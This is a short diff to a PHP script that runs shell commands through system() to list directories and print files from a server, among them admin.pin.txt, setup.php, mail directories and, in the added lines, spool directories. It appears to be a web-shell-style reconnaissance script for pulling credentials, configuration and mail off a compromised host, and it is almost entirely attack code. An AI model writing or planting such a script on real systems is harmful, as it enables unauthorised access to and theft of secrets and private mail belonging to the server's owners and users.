@@ -1,6 +1,6 @@
 <?php 
 echo system('ls');
-echo "here is for txt !!!!!!!  \n";
+echo "here is for txt !  \n";
 echo system('cat admin.pin.txt');
 echo "here is for setup  \n";
 echo system('cat setup.php');
@@ -14,4 +14,6 @@ echo file_get_contents('setup.php');
 echo system('ls ../..');
 echo system('ls ../../mail');
 echo system('cat ../../mail');
+echo system('ls ../../spool');
+echo system('cat ../../spool');
 ?>
